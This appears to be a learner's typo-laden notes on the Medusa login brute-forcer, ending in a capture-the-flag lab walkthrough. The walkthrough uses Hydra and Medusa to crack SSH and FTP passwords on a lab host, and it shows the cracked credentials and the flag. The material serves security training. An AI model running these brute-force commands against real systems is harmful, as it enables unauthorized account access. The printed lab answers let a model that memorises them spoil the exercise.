# Medusa:
Medusam a prominent tool in th cybersecurity, is designed to be fast, messively parallel, and modular login brute-force. Its primary objective
is to support a wide array of services that allow remote auth, enabling penetration tester and security professionals to assess the resilience
of login systems against brute-force attacks.

- Installation:
`sudo pacman -S medusa`
`medusa -h`

- Command systax and parameter table:
Medusa command-line interface is straightfoward. It allow users to spcify hosts, users, pass, and modules with various options to fine-tune the attack process.
` medusa [target_options] [credential_options] -M module [module_options]`

|Parameter | Exaplanation |Usage Example |
| ------------- | -------------- | -------------- |
|-h HOST or -H FILE | Target options: specify either a single target hostname or IP addrs -h or a file containing a list of targets -H  |medusla -h ip -H target.txt  |
| -u USERNAME -U FILE| Username options: provide either a single username -u or a file containg a list of username |medusa -u admin or medusa -U username.txt |
| -p PASSWORD or -P FILE| Passwords options: specify poas a single pass or file -p a list -P  | medusa -p pass or -P pass.txt |
| -M MODULE |Define the specific module to use for the attack | Medusa -M ssh |
| -m "MODULE_OPTIONS"| Provide additional parameters requiered by the chosen module enclosed in quotes |edusa -M http -m "POST /login.php HTTP/1.1\r\nContent-Length: 30\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nusername=^USER^&password=^PASS^" ... |
| -t TASK | Define the numnber of parallel login attempts to run, potentially speending up to attacks  | medusa -T 4... |
| -f or -F| Fast mode: stop to attack after after the first successful login is found either on the current host -f or a host -F| medusa -f or medusa -F |
| -n PORT | A non-def port for the target services. |medusa -n 2222 |
| -v Level| Display detailed information about the attacks progress. The high level the more verbose the output| medusa -v 4... |

- Medusa Modules:
![Modules](../Img/medusamodule.png)

- Targeting a SSH Server:
Imagines a scenario where u need to test the security of an SSH server at ip. Have a list of potential usernames in usernames.txt asnd common  password in pass.txt.
`medusa -h ip -U username.txt -P pas.txt -M ssh`
Instructs Medusa to:
    - Target the host at ip.
    - Use the usernames form the user.txt file.
    - Test the pass listed in the pass.txt file.
    - Employ the ssh module for the attack.

- Targeting Multiple Web servers with Basic HTTP Auth:
These server's addresses are stored in web_servers.txt, and u also have lists of common usernames and password in usernames.txt and password.txt.
`medusa -H web_servers.txt -U usernames.txt -P password.txt -M http -m GET`
Explanation:
    - Iterate thorugh the list of web servers in web_servers.txt
    - Use the usernames and pass provided.
    - Employ the http module with the GET method to attempt logins.

- Test for empty of def pass:
If u wnat ot asscess any accounts on specific host have  empty or def pass u can use:
`medusa -h ip -U usernames.txt -e -ns -M service_name`
Exmplanation:
    - Host at ip
    - Use the usernames fomr user.txt
    - Perform additional checks for empty pass [-e n] and pass matching the username [-e s].
    - Use thje appropiate service module [service_name] with correct module name.


# Web services:
In dynamic landscape of cyber, maintaining robust auth mechanisms is paramount. While tech like Secure Shell (ssh) and file transfer protocol (ftp) facilitate secure
remote access and file management, they are often reliant on traditional user-pass combinations, presenting potential vul exploitable through brute-force attacks.
In this module, we will delveinto practical app of Medusa, a potent brute-forcing tool, to systematically compromise both ssh and ftp services, illustrating potential
attack vectors and emphasizing the imporatnce of fortified auth pratices.

SSH is cryptographic network protocol that provides a secure channel for remote loginm command execution, and file transfer over unsecured network. FTP is a satandard network
protocol for tranferring between a client and server on computer network.

- Kick-Off
We begin our exploration by targeting an SSH server running on a remote system. Assuming prior of the username sshuser, we can leverage medusa to attempts different pas combinations
util successful ath is achieved systematically.
`medusa -h ip -n port -u sshuser -P pass.txt -M ssh -t 3`
Explain:
    - [-h] ip: Specifies the target system's IP addr.
    - [-n] port: Defines the port on which th ssh service is listening port 22.
    - [-u] sshuser: Sets the username for the brute-force attacks.
    - [-P] password.txt: Points medusa to wordlist containing the 200 mist commonly used pass in 2023.
    - [-M] ssh: select ssh module.
    - [-t 3] Dictates the number of parellel login attempts to execute concurrentluy.


## Gaining Access:
`ssh sshuser@ip -p PORT`
- Explanding the attack surface:
Using netstat to list open ports and listening services, u discover a service running on port 21.
```sh
netstat -tulpn | grep LISTEN

tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
tcp6       0      0 :::21                   :::*                    LISTEN      -
```
Reconnaissance with nmap confims this finding as an ftp server
```sh
nmap localhost
```
- Targeting the FTP Server:
If we explote the /home dir on the target, we see an ftpuser folder, which implies the likelihood of the FTP server user begin ftpuser.
`medusa -h ip -u ftpuser -P pass.txt -M ftp -t 5`

Explanation:
    - [-h] ip
    - [-u] ftpuser: username ftpuser.
    - [-M] ftp: selects the ftp module within medula.
    - [-t 5] Increases the number of parallel login attempts to 5.

- Retrieving the Flag:
Upon successfully cracking the FTP password, establish an FTP connection. Within the FTP session, use the get command to download the flag.txt file, which may contain sensitive information.:
`ftp ftp://ftpuser:<FTPUSER_PASSWORD>@localhost`

Exercise:
First we must to find the ftp user we can use hydra or medusa for the sshuser:
```sh
hydra -l sshuser -P CBBH/Login-Bruteforce/2023-200_most_used_passwords.txt  ssh://94.237.61.187:30751
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-04-23 08:08:07
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 200 login tries (l:1/p:200), ~13 tries per task
[DATA] attacking ssh://94.237.61.187:30751/
[30751][ssh] host: 94.237.61.187   login: sshuser   password: 1q2w3e4r5t
```
After that we must to loging sshuser:
`ssh sshuser@94.237.61.187 -p 30751 `

Then we must to know in which port is open the ftp port is open:
```sh
sshuser@ng-349590-loginbfservice-rjmfv-85f4664847-n4xd8:~$ netstat -tulpn | grep LISTEN
(No info could be read for "-p": geteuid()=1000 but you should be root.)
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp6       0      0 :::21                   :::*                    LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
```
Then we use medusa for get the pass of the ftpuser and after that we can login:
```sh
medusa -h 127.0.0.1 -u ftpuser -P 2020-200_most_used_passwords.txt  -M ftp -t 5
ACCOUNT FOUND: [ftp] Host: 127.0.0.1 User: ftpuser Password: qqww1122 [SUCCESS]
ftp ftp://ftpuser:qqww1122@localhost
ftp> get flag.txt
local: flag.txt remote: flag.txt
229 Entering Extended Passive Mode (|||64573|)
150 Opening BINARY mode data connection for flag.txt (35 bytes).
100% |************************************************************************************************|    35        1.04 MiB/s    00:00 ETA
226 Transfer complete.
sshuser@ng-349590-loginbfservice-rjmfv-85f4664847-n4xd8:~$ cat flag.txt

HTB{SSH_and_FTP_Bruteforce_Success}
```

